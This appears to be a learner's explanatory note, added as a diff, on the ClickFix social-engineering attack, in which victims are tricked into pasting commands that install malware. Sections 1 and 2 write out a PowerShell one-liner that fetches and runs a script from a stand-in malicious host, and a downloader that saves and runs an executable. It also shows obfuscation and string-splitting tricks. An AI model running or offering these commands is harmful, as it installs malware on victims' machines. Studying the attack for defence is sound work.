@@ -1,0 +1,137 @@
+ClickFix:
+  ClickFix is a social engineering driven + script based attack, in which the threat actor lures the victim
+  to "Fix" something by copy-paste a command in (RunDiagnol/Powershell/CMD Termainal) that downloads malware.
+
+So instead of exploiting a software vulnerabilities, the threat actor makes the user to execute malicious commands.
+
+Typical lure will be like:
+  Fix your PC
+  Verification Required
+  Fake captcha
+  update browser
+  Install codec ...
+
+Victim copies the command --> run it --> Malware downloads.
+
+=============================================================
+CLICKFIX ATTACK FLOW:
+=============================================================
+Website / Email lure
+        ↓
+Fake instruction "Press Win + R"
+        ↓
+User pastes command
+        ↓
+PowerShell / CMD executes
+        ↓
+Payload downloaded
+        ↓
+Second stage executed
+        ↓
+Persistence / C2 connection.
+
+================================================================
+
+1. Initial Access (User Trick)
+
+Press Windows + R
+Paste below:
+powershell -c "iwr http://malicious.site/file.ps1 | iex"
+
+user runs  ==> Powershell Executes
+Break down
+
+Powershell                ==>    Launches Powershell
+-c""                      ==>    Run what ever is there in strings as a command; where -c is a command
+iwr(Invoke-WebRequest)    ==>    Fetch the Information/data from the server; but not saving to the disk
+iex                       ==>    Execute
+
+Meaning: Launch powershell &  fetch file.ps1 & Execute immediately
+
+2. Stage 1 Loader (Downloader)
+This script usually:
+  Checks sandbox
+  Uses token parameter
+  Downloads secon payload
+
+Eg:
+$u="http://site/payload.exe"
+Invoke-WebRequest $u -OutFile $env:TEMP\file.exe
+Start-Process $env:TEMP\file.exe
+Breakdown:
+$u                                 ==> Variable
+-Outfile [filepath to save]        ==> writeout/save
+Start-Process                      ==> start the process
+
+Meaning: Fetch payload.exe & save it to temp file & run it
+
+3. Stage 2 Payload:
+This is real Malware: InfoStealer/RAT/Loader/Cobalt Strike/Lumma/Red line/AsyncRaT.
+
+4. Defense Evasion Techniques:
+ClickFix often uses:
+- Obfuscation                    :    powershell -enc SQBtAHAA...
+- String splitting               :    "po"+"wer"+"shell"
+- Environment Variables          :    $env:APPDATA
+
+5. SandBox Evasion:
+  ?token=unused
+      Purpose:
+          Only real user gets payload
+          Sandbox blocked
+          One-time download
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
